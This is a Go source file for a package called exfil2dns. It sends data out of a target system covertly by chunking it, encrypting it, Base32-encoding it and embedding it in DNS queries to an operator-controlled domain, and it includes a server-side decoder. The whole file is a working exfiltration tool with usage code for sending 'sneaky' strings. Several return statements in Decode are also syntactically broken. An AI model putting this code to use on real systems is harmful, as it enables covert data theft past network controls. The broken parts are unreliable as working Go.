// Package exfil2dns is used to exfil strings using encoded DNS queries to a
// specified domain.
//
// Notes
//
// This is not meant to be "the best" or "most descrete" exfil over DNS package.
// There are certainly better ways to do this, but this is a very simple and
// straightfoward example of what's possible.
//
// Exfil over DNS
//
// The idea behind exfiling data over DNS is more simple than it sounds. You
// start with the payload you want to send (Example: "HelloComputer!"). This
// payload is chunked into byte slices (<24 bytes) and encrypted using NaCl
// Secretbox with a specified key (Hashed with SHA256) and per-message nonce.
// The encrypted output from secretbox is then encoded in Base32 and built into
// a query string ([Base32 Encrypted Chunk].target.[Base32 Nonce].domain.).
// Finally, the DNS server is queried. Using the query string, the messages are
// then decoded and decrypted.
//
// Usage
//
// Basic code to initialize the client and exfil data:
//
//	import (
//		"log"
//
//		"github.com/CS-5/exfil2dns"
//	)
//
//	func main() {
//		/* Target Name: cube, Domain: example.domain, Key: ThisIsAKey1234, Chunk Size: 23 */
//		client, err := exfil2dns.NewClient("cube", "example.domain", "ThisIsAKey1234", 23)
//		if err != nil {
//			log.Fatal("Error creating client: " + err.Error())
//		}
//
//		/* Exfil "Here's a sneaky string" */
//		err = client.Exfil([]byte("Here's a sneaky string"))
//		if err != nil {
//			log.Fatal("Error exfiling data: " + err.Error())
//		}
//	}
package exfil2dns

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base32"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"sync"

	"golang.org/x/crypto/nacl/secretbox"
)

type (
	// Client contains the parameters to required to encrypt and deliver the
	// payload. Use NewClient() to initialize.
	Client struct {
		target, domain, server string
		key                    [32]byte
		chunkSize              int
		l                      *sync.Mutex
	}

	// Server contains the parameters required to decrypt messages from the 
	// exfil client. Use NewServer() to initialize.
	Server struct {
		key [32]byte
		l   *sync.Mutex
	}
)

/* Initialize Base32 encoder */
var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)

// NewClient initializes Client and returns a pointer to it.
// Target is the name of the target system. Domain is the domain to append to
// the query string. Password is the key for secretbox (SHA256 hashed). Chunk
// size is the max number of payload bytes per message, must be <24.
func NewClient(
	target, domain, password string,
	chunkSize int,
) (*Client, error) {
	return NewDevClient(target, domain, password, "", chunkSize)
}

// NewDevClient initializes Client with an optional DNS server address and
// returns a pointer to it. Target is the name of the target system (Base32
// encoded). Domain is the domain to append to the query string. Password is the
// key for secretbox (SHA256 hashed). Chunk size is the max number of payload
// bytes per message, must be <24.
func NewDevClient(
	target, domain, password, server string,
	chunkSize int,
) (*Client, error) {
	if chunkSize > 23 {
		return &Client{},
			fmt.Errorf("chunk size cannot be greater than 23. Got: %v", chunkSize)
	}

	return &Client{
		target:    b32.EncodeToString([]byte(target)),
		domain:    domain,
		key:       sha256.Sum256([]byte(password)),
		server:    server,
		chunkSize: chunkSize,
		l:         new(sync.Mutex),
	}, nil
}

// NewServer initializes Server and returs a pointer to it.
// Password is hashed with SHA256.
func NewServer(password string) *Server {
	return &Server{
		key: sha256.Sum256([]byte(password)),
		l:   new(sync.Mutex),
	}
}

// ExfilString takes a string payload converts it to a byte slice and exfils.
func (c *Client) ExfilString(payload string) error {
	return c.Exfil([]byte(payload))
}

// Exfil takes a byte slice payload splits it into chunks and exfils.
// Chunk lengths are declared when a client is initialized. Each chunk is
// encrypted, encoded, and sent as an individual query.
func (c *Client) Exfil(payload []byte) error {
	c.l.Lock()
	defer c.l.Unlock()

	/* Read and chunk payload */
	in := bytes.NewReader(payload)
	chunk := make([]byte, c.chunkSize)
	for {
		l, err := in.Read(chunk)
		if l != 0 {
			/* Encode and query the DNS server */
			q, err := c.send(c.encode(chunk[:l]))
			if err != nil {
				return fmt.Errorf("Unable to query: %s. %v", q, err)
			}
		}
		if errors.Is(err, io.EOF) {
			break
		}
		if err != nil {
			return fmt.Errorf("Payload read error: %v", err)
		}
	}
	return nil
}

// encode takes a chunk and encrypts it with secretbox and builds a query. Each
// time encode is called, a unique nonce is created.
func (c *Client) encode(chunk []byte) string {

	/* Generate nonce */
	var nonce [24]byte
	if _, err := rand.Read(nonce[:]); nil != err {
		log.Fatalf("Unable to get nonce: %v", err)
	}

	/* Encrypt chunk */
	encryptedBytes := secretbox.Seal([]byte{}, chunk, &nonce, &c.key)

	return strings.ToLower(fmt.Sprintf(
		"%s.%s.%s.%s.",
		b32.EncodeToString(encryptedBytes),
		c.target,
		b32.EncodeToString(nonce[:]),
		c.domain),
	)
}

// send takes a query string and queries the system's DNS resolver.
// Note: For development, it is possible to specify a custom DNS server, however
// this implementation is considered a hack and shouldn't be relied on.
func (c *Client) send(query string) (string, error) {
	var resolver *net.Resolver

	/* If a custom DNS server is specified, use it (Development/Testing) */
	if c.server == "" {
		resolver = net.DefaultResolver
	} else {
		resolver = &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context,
				network, address string,
			) (net.Conn, error) {
				d := net.Dialer{}
				return d.DialContext(ctx, "udp", c.server)
			},
		}
	}

	_, err := resolver.LookupIPAddr(context.Background(), query)

	var de *net.DNSError
	if err != nil && !(errors.As(err, &de) && de.IsNotFound) {
		return "", fmt.Errorf("error resolving %s: %v", query, err)
	}
	return query, nil
}

// Decode takes a query string recieved and returns a 2 element string slice.
// Index 0 is the name of the target recieved and index 1 is the payload.
func (s *Server) Decode(query string) ([2]string, error) {
	/* Convert query string to upper case and split into the first 4 parts */
	parts := strings.SplitN(strings.ToUpper(query), ".", 4)
	if len(parts) < 4 {
		return [2]string{}, fmt.Errorf("[%s] Not enough parts to query")
	}

	/* Decode payload */
	payload, err := b32.DecodeString(parts[0])
	if err != nil {
		return [2]string{}, 
		fmt.Errorf("[%s] Error decoding payload: %v", query, err),
	}

	/* Decode target */
	target, err := b32.DecodeString(parts[1])
	if err != nil {
		return [2]string{}, 
		fmt.Errorf("[%s] Error decoding target: %v", query, err),
	}

	/* Decode and verify nonce */
	var nonce [24]byte
	l, err := b32.Decode(nonce[:], []byte(parts[2]))
	if err != nil {
		return [2]string{}, 
		fmt.Errorf("[%s] Error decoding nonce: %v", query, err),
	}

	if l != len(nonce) {
		return [2]string{}, fmt.Errorf(
			"[%s] Error reading nonce. Want %d bytes, got %d",
			query,
			len(nonce),
			l,
		)
	}

	/* Decrypt payload */
	decrypted, ok := secretbox.Open([]byte{}, payload, &nonce, &s.key)
	if !ok {
		return [2]string{}, fmt.Errorf("[%s] Error decrypting payload", query)
	}
	return [2]string{string(target), string(decrypted)}, nil
}
